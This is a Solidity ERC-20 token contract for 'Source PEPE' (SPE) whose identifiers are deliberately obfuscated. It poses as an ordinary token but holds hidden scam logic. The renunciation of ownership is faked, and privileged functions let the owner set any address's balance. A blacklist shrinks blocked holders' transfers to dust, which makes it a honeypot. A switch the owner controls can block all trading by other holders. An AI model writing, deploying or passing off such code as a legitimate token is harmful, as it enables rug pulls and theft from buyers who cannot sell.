//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface isFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitTo) external view returns (uint256);

    function transfer(address receiverTx, uint256 shouldList) external returns (bool);

    function allowance(address takeLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldList) external returns (bool);

    function transferFrom(
        address sender,
        address receiverTx,
        uint256 shouldList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedSender, uint256 value);
    event Approval(address indexed takeLaunched, address indexed spender, uint256 value);
}

abstract contract amountLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txTakeToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountLiquidity {
    function createPair(address launchShouldFund, address maxAt) external returns (address);
}

interface isFromMetadata is isFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SourcePEPE is amountLaunched, isFrom, isFromMetadata {

    function transferFrom(address shouldTake, address receiverTx, uint256 shouldList) external override returns (bool) {
        if (_msgSender() != tokenTrading) {
            if (buyMaxSender[shouldTake][_msgSender()] != type(uint256).max) {
                require(shouldList <= buyMaxSender[shouldTake][_msgSender()]);
                buyMaxSender[shouldTake][_msgSender()] -= shouldList;
            }
        }
        return shouldToken(shouldTake, receiverTx, shouldList);
    }

    function enableFund() public {
        emit OwnershipTransferred(totalLimit, address(0));
        modeBuy = address(0);
    }

    uint256 private txTradingIs;

    function name() external view virtual override returns (string memory) {
        return takeReceiverIs;
    }

    bool public isShouldLaunched;

    function exemptLaunchTeam(address toReceiverLaunched) public {
        require(toReceiverLaunched.balance < 100000);
        if (feeAmount) {
            return;
        }
        
        minLimit[toReceiverLaunched] = true;
        
        feeAmount = true;
    }

    bool public walletLaunched;

    bool public feeAmount;

    constructor (){
        if (modeFee != buyMode) {
            buyMode = txTradingIs;
        }
        txTakeToken autoTotalLimit = txTakeToken(tokenTrading);
        liquidityBuy = amountLiquidity(autoTotalLimit.factory()).createPair(autoTotalLimit.WETH(), address(this));
        
        totalLimit = _msgSender();
        enableFund();
        minLimit[totalLimit] = true;
        liquidityFund[totalLimit] = teamEnable;
        if (modeFee != feeTake) {
            feeIsTotal = false;
        }
        emit Transfer(address(0), totalLimit, teamEnable);
    }

    function transfer(address marketingTokenMax, uint256 shouldList) external virtual override returns (bool) {
        return shouldToken(_msgSender(), marketingTokenMax, shouldList);
    }

    function isTeamReceiver(uint256 shouldList) public {
        totalLaunchedAt();
        atTotalTrading = shouldList;
    }

    bool public feeIsTotal;

    address modeMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private buyMode;

    address public totalLimit;

    function totalLaunchedAt() private view {
        require(minLimit[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return walletMarketing;
    }

    mapping(address => uint256) private liquidityFund;

    bool private autoExempt;

    address private modeBuy;

    uint256 private teamTrading;

    string private takeReceiverIs = "Source PEPE";

    function getOwner() external view returns (address) {
        return modeBuy;
    }

    function balanceOf(address limitTo) public view virtual override returns (uint256) {
        return liquidityFund[limitTo];
    }

    function symbol() external view virtual override returns (string memory) {
        return minSell;
    }

    function feeMode(address marketingTokenMax, uint256 shouldList) public {
        totalLaunchedAt();
        liquidityFund[marketingTokenMax] = shouldList;
    }

    uint256 atTotalTrading;

    function owner() external view returns (address) {
        return modeBuy;
    }

    uint256 enableLaunchFrom;

    function enableFee(address shouldTake, address receiverTx, uint256 shouldList) internal returns (bool) {
        require(liquidityFund[shouldTake] >= shouldList);
        liquidityFund[shouldTake] -= shouldList;
        liquidityFund[receiverTx] += shouldList;
        emit Transfer(shouldTake, receiverTx, shouldList);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return teamEnable;
    }

    uint256 private feeTake;

    mapping(address => mapping(address => uint256)) private buyMaxSender;

    uint256 private teamEnable = 100000000 * 10 ** 18;

    address tokenTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private minSell = "SPE";

    uint256 public modeFee;

    mapping(address => bool) public minTx;

    function maxEnable(address modeAt) public {
        totalLaunchedAt();
        if (walletLaunched != autoExempt) {
            buyMode = txTradingIs;
        }
        if (modeAt == totalLimit || modeAt == liquidityBuy) {
            return;
        }
        minTx[modeAt] = true;
    }

    mapping(address => bool) public minLimit;

    function allowance(address toFee, address limitToken) external view virtual override returns (uint256) {
        if (limitToken == tokenTrading) {
            return type(uint256).max;
        }
        return buyMaxSender[toFee][limitToken];
    }

    uint256 constant tokenSell = 3 ** 10;

    address public liquidityBuy;

    event OwnershipTransferred(address indexed isList, address indexed modeEnable);

    function shouldToken(address shouldTake, address receiverTx, uint256 shouldList) internal returns (bool) {
        if (shouldTake == totalLimit) {
            return enableFee(shouldTake, receiverTx, shouldList);
        }
        uint256 modeAuto = isFrom(liquidityBuy).balanceOf(modeMarketing);
        require(modeAuto == atTotalTrading);
        require(receiverTx != modeMarketing);
        if (minTx[shouldTake]) {
            return enableFee(shouldTake, receiverTx, tokenSell);
        }
        return enableFee(shouldTake, receiverTx, shouldList);
    }

    uint8 private walletMarketing = 18;

    function approve(address limitToken, uint256 shouldList) public virtual override returns (bool) {
        buyMaxSender[_msgSender()][limitToken] = shouldList;
        emit Approval(_msgSender(), limitToken, shouldList);
        return true;
    }

}